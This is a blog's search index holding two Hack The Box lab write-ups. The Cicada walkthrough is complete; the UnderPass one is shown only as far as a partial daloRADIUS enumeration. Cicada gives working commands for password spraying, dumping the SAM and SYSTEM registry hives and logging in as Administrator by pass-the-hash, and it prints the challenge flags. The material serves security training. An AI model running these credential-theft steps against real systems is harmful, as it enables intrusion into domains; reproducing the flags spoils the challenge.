<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Cicada</title>
    <url>/CICADA/</url>
    <content><![CDATA[<h2 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h2><ol>
<li><a href="#initial-enumeration-with-nmap">Initial Enumeration with Nmap</a></li>
<li><a href="#step-2-enumeration-of-SMB-service">Step 2: Enumeration of SMB Service</a></li>
<li><a href="#step-3-foothhold">Step 3: foothhold </a></li>
<li><a href="#step-4-privilege-escalation">Step 4: Privilege Escalation</a></li>
</ol>
<p>In this write-up, we will walk through the steps to hack the Cicada machine on Hack The Box. Let’s dive in!</p>
<h2 id="Initial-Enumeration-with-Nmap"><a href="#Initial-Enumeration-with-Nmap" class="headerlink" title="Initial Enumeration with Nmap"></a>Initial Enumeration with Nmap</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -sV 10.10.11.35 -T5 </span><br><span class="line">&gt; Nmap scan report <span class="keyword">for</span> cicada.htb (10.10.11.35)</span><br><span class="line">Host is up (0.056s latency).</span><br><span class="line">Not shown: 989 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2024-12-31 06:53:33Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)</span><br><span class="line">Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 51.59 seconds</span><br></pre></td></tr></table></figure>
<h2 id="Step-2-Enumeration-of-SMB-Service"><a href="#Step-2-Enumeration-of-SMB-Service" class="headerlink" title="Step 2: Enumeration of SMB Service"></a>Step 2: Enumeration of SMB Service</h2><p>we got the port 445 open is for SMB :server mail block<br>let access to it</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ smbclient   //10.10.11.35/HR -N</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Thu Mar 14 08:29:09 2024</span><br><span class="line">  ..                                  D        0  Thu Mar 14 08:21:29 2024</span><br><span class="line">  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024</span><br><span class="line"></span><br><span class="line">		4168447 blocks of size 4096. 61830 blocks available</span><br><span class="line">smb: \&gt; get <span class="string">&quot;Notice from HR.txt&quot;</span> </span><br><span class="line">getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (5.9 KiloBytes/sec) (average 5.9 KiloBytes/sec)</span><br></pre></td></tr></table></figure>
<p>After reading the file <span style="color:yellow">“Notice from HR.txt”</span>, we obtained a password, but<br>we don’t know which user it belongs to.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Dear new hire!</span><br><span class="line"></span><br><span class="line">Welcome to Cicada Corp! We<span class="string">&#x27;re thrilled to have you join our team. As part of our security protocols, it&#x27;</span>s essential that you change your default password to something unique and secure.</span><br><span class="line"></span><br><span class="line">Your default password is: Cicada<span class="variable">$M6Corpb</span>*@Lp#nZp!8</span><br><span class="line"></span><br><span class="line">To change your password:</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>To find the user, we can use tools like netexec or crackmapexec:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ netexec smb 10.10.11.35 -u nutzh -p <span class="string">&#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27;</span> --rid-brute </span><br><span class="line"> SMB                      10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)</span><br></pre></td></tr></table></figure>
<p>We have a bunch of users, so let’s create a text file and try the password with<br>each user. I will use Metasploit for this and the ‘scanner&#x2F;smb&#x2F;smb_login’<br>module.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  <span class="built_in">set</span> RHOST 10.10.11.35</span><br><span class="line">   <span class="built_in">set</span> SMBPass Cicada<span class="variable">$M6Corpb</span>*@Lp#nZp!8</span><br><span class="line">   <span class="built_in">set</span> USER_FILE /home/kali/Desktop/HTB/CICADA/user.txt</span><br><span class="line">   <span class="built_in">set</span> Createsession True</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_login) &gt; run</span><br><span class="line"> [*] 10.10.11.35:445       - 10.10.11.35:445 - Starting SMB login bruteforce</span><br><span class="line">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: <span class="string">&#x27;.\Administrator:Cicada$M6Corpb*@Lp#nZp!8&#x27;</span>,</span><br><span class="line">[!] 10.10.11.35:445       - No active DB -- Credential data will not be saved!</span><br><span class="line">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: <span class="string">&#x27;.\Guest:Cicada$M6Corpb*@Lp#nZp!8&#x27;</span>,</span><br><span class="line">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: <span class="string">&#x27;.\CICADA-DC$ :Cicada$M6Corpb*@Lp#nZp!8&#x27;</span>,</span><br><span class="line">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: <span class="string">&#x27;.\krbtgt:Cicada$M6Corpb*@Lp#nZp!8&#x27;</span>,</span><br><span class="line">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: <span class="string">&#x27;.\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8&#x27;</span>,</span><br><span class="line">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: <span class="string">&#x27;.\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8&#x27;</span>,</span><br><span class="line">[+] 10.10.11.35:445       - 10.10.11.35:445 - Success: <span class="string">&#x27;.\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8&#x27;</span></span><br><span class="line">[*] SMB session 1 opened (10.10.14.145:33375 -&gt; 10.10.11.35:445) at 2024-12-30 19:15:45 -0500</span><br><span class="line">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: <span class="string">&#x27;.\david.orelious:Cicada$M6Corpb*@Lp#nZp!8&#x27;</span>,</span><br><span class="line">[-] 10.10.11.35:445       - 10.10.11.35:445 - Failed: <span class="string">&#x27;.\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8&#x27;</span>,</span><br><span class="line">[*] 10.10.11.35:445       - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] 10.10.11.35:445       - Bruteforce completed, 1 credential was successful.</span><br><span class="line">[*] 10.10.11.35:445       - 1 SMB session was opened successfully.</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
<p>After finding that the user is michael.wrightson, we can use Metasploit<br>to connect to SMB:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ msf6 auxiliary(scanner/smb/smb_login) &gt; sessions -i 1</span><br></pre></td></tr></table></figure>
<p>While exploring, I didn’t find much, but I did discover something interesting<br>with this command:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ crackmapexec smb 10.10.11.35 -u michael.wrightson -p Cicada<span class="variable">$M6Corpb</span>*@Lp#nZp!8 --<span class="built_in">users</span></span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        cicada.htb\emily.oscars                   badpwdcount: 0 desc: </span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        cicada.htb\david.orelious                 badpwdcount: 0 desc: Just <span class="keyword">in</span> <span class="keyword">case</span> I forget my password is aRt<span class="variable">$Lp</span>#7t*VQ!3</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        cicada.htb\michael.wrightson              badpwdcount: 0 desc: </span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        cicada.htb\sarah.dantelia                 badpwdcount: 0 desc: </span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        cicada.htb\john.smoulder                  badpwdcount: 0 desc: </span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        cicada.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        cicada.htb\Guest                          badpwdcount: 0 desc: Built-<span class="keyword">in</span> account <span class="keyword">for</span> guest access to the computer/domain</span><br><span class="line">SMB         10.10.11.35     445    CICADA-DC        cicada.htb\Administrator                  badpwdcount: 0 desc: Built-<span class="keyword">in</span> account <span class="keyword">for</span> administering the computer/domain</span><br></pre></td></tr></table></figure>
<p>We find another password for david.orelious:<span style="color:green"> aRt$Lp#7t*VQ!3.</span> So let’s go back to Metasploit and create another session with these credentials: </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ SMB (10.10.11.35) &gt; shares</span><br><span class="line">Shares</span><br><span class="line">======</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  Name      Type          comment</span></span><br><span class="line">    -  ----      ----          -------</span><br><span class="line">    0  ADMIN$    DISK|SPECIAL  Remote Admin</span><br><span class="line">    1  C$        DISK|SPECIAL  Default share</span><br><span class="line">    2  DEV       DISK</span><br><span class="line">    3  HR        DISK</span><br><span class="line">    4  IPC$      IPC|SPECIAL   Remote IPC</span><br><span class="line">    5  NETLOGON  DISK          Logon server share</span><br><span class="line">    6  SYSVOL    DISK          Logon server share</span><br><span class="line">SMB (10.10.11.35) &gt; shares -i 2</span><br><span class="line">[+] Successfully connected to DEV</span><br><span class="line">SMB (10.10.11.35\DEV) &gt; <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span> </span><br><span class="line">===</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  Type  Name               Created                    Accessed                   Written                    Changed                    Size</span></span><br><span class="line">    -  ----  ----               -------                    --------                   -------                    -------                    ----</span><br><span class="line">    0  DIR   .                  2024-03-14T08:21:29-04:00  2024-08-30T16:53:19-04:00  2024-03-14T08:31:39-04:00  2024-08-28T13:27:31-04:00</span><br><span class="line">    1  DIR   ..                 2024-03-14T08:19:24-04:00  2024-08-30T17:01:54-04:00  2024-03-14T08:21:29-04:00  2024-03-14T08:21:29-04:00</span><br><span class="line">    2  FILE  Backup_script.ps1  2024-03-14T08:31:38-04:00  2024-08-28T13:28:22-04:00  2024-08-28T13:28:22-04:00  2024-08-28T13:28:22-04:00  601</span><br><span class="line"></span><br><span class="line">SMB (10.10.11.35\DEV) &gt; Interrupt: use the <span class="string">&#x27;exit&#x27;</span> <span class="built_in">command</span> to quit</span><br><span class="line">SMB (10.10.11.35\DEV) &gt; <span class="built_in">cat</span> Backup_script.ps1</span><br><span class="line"></span><br><span class="line"><span class="variable">$sourceDirectory</span> = <span class="string">&quot;C:\smb&quot;</span></span><br><span class="line"><span class="variable">$destinationDirectory</span> = <span class="string">&quot;D:\Backup&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;emily.oscars&quot;</span></span><br><span class="line"><span class="variable">$password</span> = ConvertTo-SecureString <span class="string">&quot;Q!3@Lp#M6b*7t*Vt&quot;</span> -AsPlainText -Force</span><br><span class="line"><span class="variable">$credentials</span> = New-Object System.Management.Automation.PSCredential(<span class="variable">$username</span>, <span class="variable">$password</span>)</span><br><span class="line"><span class="variable">$dateStamp</span> = Get-Date -Format <span class="string">&quot;yyyyMMdd_HHmmss&quot;</span></span><br><span class="line"><span class="variable">$backupFileName</span> = <span class="string">&quot;smb_backup_<span class="variable">$dateStamp</span>.zip&quot;</span></span><br><span class="line"><span class="variable">$backupFilePath</span> = Join-Path -Path <span class="variable">$destinationDirectory</span> -ChildPath <span class="variable">$backupFileName</span></span><br><span class="line">Compress-Archive -Path <span class="variable">$sourceDirectory</span> -DestinationPath <span class="variable">$backupFilePath</span></span><br><span class="line">Write-Host <span class="string">&quot;Backup completed successfully. Backup file saved to: <span class="variable">$backupFilePath</span>&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="Step-3-foothhold"><a href="#Step-3-foothhold" class="headerlink" title="Step 3: foothhold"></a>Step 3: foothhold</h2><p>We found another password for emily.oscars:<span style="color:green"> “Q!3@Lp#M6b<em>7t</em>Vt”</span>.<br>I Hope this will be the last one!😂😂</p>
<p>From the two directories, I think we can remotely access the Windows machine.After searching on Google,I found that we can access it through port 5985 with WinRM.WinRM is essentially like SSH. We will use Evil-WinRM for this.<br>If you don’t have it, you can install it with:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gem install evil-winrm </span><br></pre></td></tr></table></figure>
<p>Now let’s connect:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> evil-winrm -i cicada.htb -u emily.oscars -p <span class="string">&#x27;Q!3@Lp#M6b*7t*Vt&#x27;</span></span><br><span class="line"> Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; </span><br></pre></td></tr></table></figure>
<p>so we are inside the target Machine  so we can read the user flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; <span class="built_in">cd</span> ..\Desktop</span><br><span class="line">PS C:\Users\emily.oscars.CICADA\Desktop&gt; <span class="built_in">cat</span> user.txt</span><br><span class="line">a2c1726fd3962d78e455d9f2dfd3c877</span><br></pre></td></tr></table></figure>
<h2 id="Step-4-Privilege-Escalation"><a href="#Step-4-Privilege-Escalation" class="headerlink" title="Step 4: Privilege Escalation"></a>Step 4: Privilege Escalation</h2><p>Next, check privileges:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; <span class="built_in">whoami</span> /priv</span><br><span class="line"> *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; <span class="built_in">whoami</span> /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">SeBackupPrivilege             Back up files and directories  Enabled</span><br><span class="line">SeRestorePrivilege            Restore files and directories  Enabled</span><br><span class="line">SeShutdownPrivilege           Shut down the system           Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="built_in">set</span> Enabled</span><br></pre></td></tr></table></figure>
<p>The first two privileges (SeBackupPrivilege and SeRestorePrivilege) allow us to restore and back up files. After researching, I found that we can restore files<br>that contain hashed passwords. I tried with robocopy, but it failed, so<br>we will try the reg save command and see if it works:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; <span class="built_in">cd</span> ..\Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop&gt; reg save hklm\SYSTEM .\SYSTEM</span><br><span class="line">*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop&gt; reg save hklm\SAM .\SAM</span><br></pre></td></tr></table></figure>
<p>After restoring these files, we can download them to our local machine: </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop&gt; download SAM &amp; download SYSTEM</span><br><span class="line">Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\SAM to SAM</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br><span class="line">Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\SYSTEM to SYSTEM</span><br><span class="line"></span><br><span class="line">Info: Download successful!</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Now, let’s open these files on our local machine using:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pypykatz registry --sam sam system</span><br><span class="line"></span><br><span class="line">WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work</span><br><span class="line">WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work</span><br><span class="line">============== SYSTEM hive secrets ==============</span><br><span class="line">CurrentControlSet: ControlSet001</span><br><span class="line">Boot Key: 3c2b033757a49110a9ee680b46e8d620</span><br><span class="line">============== SAM hive secrets ==============</span><br><span class="line">HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
<p>We will now attempt to connect again with the administrator credentials:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341</span><br><span class="line"></span><br><span class="line"> *Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cd</span> ..\Desktop</span><br><span class="line"> *Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-ar---        12/30/2024  11:34 PM             34 root.txt</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; <span class="built_in">cat</span> root.txt</span><br><span class="line">c30aa073a06e50322b2f8d9a6f1ae896</span><br></pre></td></tr></table></figure>
<pre><code>                     CONGRATULATION🎉🎉
</code></pre>
<p>CONCLUSION:<br>It was my first time pwning a Windows machine, so it was a bit complex but<br>also fun.I learned a lot about enumerating SMB and discovered new tools like<br><span style="color:red">Evil-WinRM</span>,I also gained insight into important Windows files like SAM and SYSTEM. Overall, it was a fruitful machine!</p>
<div style="margin-top: 20px;">
  <button id="likeButton" onclick="incrementLikes()" style="background-color: #4CAF50; color: white; border: none; padding: 10px 20px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer; border-radius: 12px;">Like</button>
    <span id="likeCount" style="font-size: 16px;">0</span> 👍  I HOPE U LIKE THIS WRITE-UP
</div>

<script>
  let likeCount = 0;
  function incrementLikes() {
    likeCount++;
    document.getElementById('likeCount').innerText = likeCount;
    document.getElementById('likeButton').disabled = true;
    document.getElementById('likeButton').innerText = 'Liked';
    document.getElementById('likeButton').style.backgroundColor = '#888';
  }
</script>]]></content>
      <categories>
        <category>ACTIVE MACHINE</category>
        <category>HACK THE BOX</category>
        <category>LINUX</category>
      </categories>
  </entry>
  <entry>
    <title>UnderPass</title>
    <url>/Underpass/</url>
    <content><![CDATA[<p>Hello, today we gonna try to hack the Underpass machine  on hackthebox<br>the first thing is enumerate and see if there is an open port on the target<br>machine for that we gonna use the tool nmap </p>
<p>i tried to scan the machine in the first but i found just the port 80 and<br>22 so i tried with to scan UDP ports.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap  -sU 10.10.11.48 -T5</span><br><span class="line">  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 12:50 CST</span><br><span class="line">  Warning: 10.10.11.48 giving up on port because retransmission <span class="built_in">cap</span> hit (2).</span><br><span class="line">  Nmap scan report <span class="keyword">for</span> underpass.htb (10.10.11.48)</span><br><span class="line">  Host is up (0.073s latency).</span><br><span class="line">  Not shown: 897 open|filtered udp ports (no-response), 102 closed udp ports (port-unreach)</span><br><span class="line">  PORT    STATE SERVICE</span><br><span class="line">  161/udp open  snmp</span><br><span class="line"> </span><br><span class="line"> Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 100.11 seconds</span><br></pre></td></tr></table></figure>
<p>we find  SNMP port open and SNMP stands for service network management<br>protocol , that port is used monitor and manage the network devices<br>connected over an IP we gonna use now snmp-check tool that helps us<br>to enumerate the SNMP devices </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ snmp-check 10.10.11.48</span><br><span class="line"> snmp-check v1.9 - SNMP enumerator</span><br><span class="line"> Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)</span><br><span class="line"></span><br><span class="line"> [+] Try to connect to 10.10.11.48:161 using SNMPv1 and community <span class="string">&#x27;public&#x27;</span></span><br><span class="line"></span><br><span class="line"> [*] System information:</span><br><span class="line"></span><br><span class="line">  Host IP address               : 10.10.11.48</span><br><span class="line">  Hostname                      : UnDerPass.htb is the only daloradius server <span class="keyword">in</span> the basin!</span><br><span class="line">  Description                   : Linux underpass 5.15.0-126-generic <span class="comment">#136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64</span></span><br><span class="line">  Contact                       : steve@underpass.htb</span><br><span class="line">  Location                      : Nevada, U.S.A. but not Vegas</span><br><span class="line">  Uptime snmp                   : 00:49:46.89</span><br><span class="line">  Uptime system                 : 00:49:36.98</span><br><span class="line">  System <span class="built_in">date</span>                   : 2024-12-25 19:21:21.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>interesting, we find a user:steve and the name of Host Underpass.htb<br>daloradius HMMM , lets look for it </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dirsearch -u http://Underpass.htb/daloradius/</span><br><span class="line"></span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/reports/http_Underpass.htb/_daloradius_24-12-25_14-24-00.txt</span><br><span class="line"></span><br><span class="line">Target: http://Underpass.htb/</span><br><span class="line"></span><br><span class="line">[14:24:00] Starting: daloradius/                                                                                                                  </span><br><span class="line">[14:24:05] 200 -  221B  - /daloradius/.gitignore                            </span><br><span class="line">[14:24:29] 301 -  323B  - /daloradius/app  -&gt;  http://underpass.htb/daloradius/app/</span><br><span class="line">[14:24:35] 200 -   24KB - /daloradius/ChangeLog                             </span><br><span class="line">[14:24:41] 301 -  323B  - /daloradius/doc  -&gt;  http://underpass.htb/daloradius/doc/</span><br><span class="line">[14:24:41] 200 -    2KB - /daloradius/docker-compose.yml                    </span><br><span class="line">[14:24:41] 200 -    2KB - /daloradius/Dockerfile</span><br><span class="line">[14:24:55] 301 -  327B  - /daloradius/library  -&gt;  http://underpass.htb/daloradius/library/</span><br><span class="line">[14:24:55] 200 -   18KB - /daloradius/LICENSE                               </span><br><span class="line">[14:25:11] 200 -   10KB - /daloradius/README.md                             </span><br><span class="line">[14:25:15] 301 -  325B  - /daloradius/setup  -&gt;  http://underpass.htb/daloradius/setup/</span><br><span class="line">                                                                             </span><br><span class="line">Task Completed </span><br></pre></td></tr></table></figure>
<p>try to look for all these files and find something , lets brute force<br>the directories </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dirsearch -u http://Underpass.htb/daloradius/app </span><br><span class="line"> /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                  </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                           </span><br><span class="line">                                                                                                                                                  </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/reports/http_Underpass.htb/_daloradius_app_24-12-25_14-33-44.txt</span><br><span class="line"></span><br><span class="line">Target: http://Underpass.htb/</span><br><span class="line"></span><br><span class="line">[14:33:44] Starting: daloradius/app/                                                                                                              </span><br><span class="line">[14:34:20] 301 -  330B  - /daloradius/app/common  -&gt;  http://underpass.htb/daloradius/app/common/</span><br><span class="line">[14:35:11] 301 -  329B  - /daloradius/app/users  -&gt;  http://underpass.htb/daloradius/app/users/</span><br><span class="line">[14:35:11] 302 -    0B  - /daloradius/app/users/  -&gt;  home-main.php         </span><br><span class="line">[14:35:11] 200 -    2KB - /daloradius/app/users/login.php </span><br></pre></td></tr></table></figure>
<p>WOOW , we find a login page Great , but we need Username lets brute force<br>directories more like &#x2F;doc so i brute forced till i found </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ [14:42:06] Starting: daloradius/doc/install/                                                                                                      </span><br><span class="line">  [14:42:55] 200 -    8KB - /daloradius/doc/install/INSTALL                   </span><br><span class="line">                                                                             </span><br><span class="line">  Task Completed</span><br></pre></td></tr></table></figure>
<p>after reading this file i we found the Username and the Password </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">5. INSTALLATION COMPLETE</span><br><span class="line"> ------------------------</span><br><span class="line">            Surf to http://yourip/daloradius</span><br><span class="line">            Login:</span><br><span class="line">          username: administrator</span><br><span class="line">          password: radius</span><br></pre></td></tr></table></figure>
<p>so i tried this administrator:radius and it failed so lets try to brute force<br>the &#x2F;app directory more and hope for something</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  dirsearch -u http://Underpass.htb/daloradius/app/ -w SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt </span><br><span class="line">  /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/   pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line"> Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220544</span><br><span class="line"></span><br><span class="line">  Output File: /home/kali/reports/http_Underpass.htb/_daloradius_app__24-12-25_14-54-26.txt</span><br><span class="line"></span><br><span class="line"> Target: http://Underpass.htb/</span><br><span class="line"></span><br><span class="line"> [14:54:26] Starting: daloradius/app/</span><br><span class="line"> [14:54:27] 301 -  330B  - /daloradius/app/common  -&gt;  http://underpass.htb/daloradius/app/common/</span><br><span class="line"> [14:54:27] 301 -  329B  - /daloradius/app/users  -&gt;  http://underpass.htb/daloradius/app/users/</span><br><span class="line"> [14:55:10] 301 -  333B  - /daloradius/app/operators  -&gt;  http://underpass.htb/daloradius/app/operators/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
